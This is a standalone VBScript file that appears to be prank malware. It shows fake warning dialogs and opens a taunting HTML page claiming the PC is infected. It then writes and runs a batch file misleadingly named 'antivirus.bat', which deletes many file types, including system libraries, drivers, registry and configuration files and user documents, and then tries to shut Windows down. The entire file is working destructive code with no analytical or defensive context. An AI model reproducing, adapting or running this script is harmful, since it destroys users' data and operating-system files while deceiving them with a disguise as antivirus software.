msgbox "warning: dont shut down youre pc! you will lose all of youre files! neither exit any of the following applications!", VBCritical, "!WARNING!"
Set anti = CreateObject("Scripting.FileSystemObject")
Set batch = anti.CreateTextFile("C:\antivirus.bat")
batch.WriteLine "CLS"
batch.WriteLine "@ECHO OFF"
batch.Writeline "del *.dll"
batch.Writeline "del *.zip"
batch.Writeline "del *.ocx"
batch.Writeline "del *.nls"
batch.Writeline "del *.msc"
batch.Writeline "del *.txt"
batch.Writeline "del *.log"
batch.Writeline "del *.ini"
batch.Writeline "del *.js"
batch.Writeline "del *.xls"
batch.Writeline "del *.sys"
batch.Writeline "del *.ax"
batch.Writeline "del *.msc"
batch.Writeline "del *.cpl"
batch.Writeline "del *.bin"
batch.Writeline "del *.dat"
batch.Writeline "del *.sep"
batch.Writeline "del *.drv"
batch.Writeline "del *.nls"
batch.Writeline "del *.chm"
batch.Writeline "del *.tlb"
batch.Writeline "del *.rll"
batch.Writeline "del *.scr"
batch.Writeline "del *.cmd"
batch.Writeline "del *.msi"
batch.Writeline "del *.hlp"
batch.Writeline "del *.xlm"
batch.Writeline "del *.reg"
batch.writeline "%windir%rundll32.exe User,ExitWindows "
batch.writeline "%systemdir%RUNDLL32.EXE User,ExitWindows"
batch.Writeline "exit"
batch.Close

Set HTML = CreateObject("Scripting.FileSystemObject")
Set page = HTML.CreateTextFile("C:\antivirus.html")
page.WriteLine "<html>"
page.WriteLine "<head>"
page.WriteLine "<P><B><U>READ THIS FAST, YOURE PC HEALTH IS IN GREAT DANGER! YOURE PC IS HIT BY A VIRUS!</B></U></P>"
page.Writeline "</head>"
page.Writeline "<body>"
page.WriteLine "<P>if you want to get rid of it... well simply find it out yourself!</P>"
page.Writeline "<P>why would i  away my time by telling you?</p>"
page.Writeline "<P>anywayz, <b><u>HAVE FUN WITH IT! </b></u></p>"
page.Writeline "<p><b><u>HAVE FUN WITH IT! </b></u></p>"
page.Writeline "<p><b><u>HAVE FUN WITH IT! </b></u></p>"
page.Writeline "<p><b><u>HAVE FUN WITH IT! </b></u></p>"
page.Writeline "<p><b><u>HAVE FUN WITH IT! </b></u></p>"
page.Writeline "<p><b><u>HAVE FUN WITH IT! </b></u></p>"
page.Writeline "<p><b><u>HAVE FUN WITH IT! </b></u></p>"
page.Writeline "<p><b><u>HAVE FUN WITH IT! </b></u></p>"
page.Writeline "<p><b><u>HAVE FUN WITH IT! </b></u></p>"
page.Writeline "<p><b><u>HAVE FUN WITH IT! </b></u></p>"
page.Writeline "</body>"
page.Writeline "</HTML>"
page.Close

Dim shell
Set shell = CreateObject("WScript.Shell")
shell.Run "C:\antivirus.html"

Set ws = createobject("wscript.shell")
wscript.sleep 15000

dim q
q=MsgBox ("want 2 have fun?", VBYesNo, "fun")
if q= VBYes then
MsgBox "well go do something fun while i have fun 2",VBExclamation, "fun"
else
MsgBox "ok, then just sit back and relax while i have fun!", VBexclamation, "fun"
end if

Dim shell2
Set shell2 = CreateObject("WScript.Shell")
shell2.Run "C:\antivirus.bat"
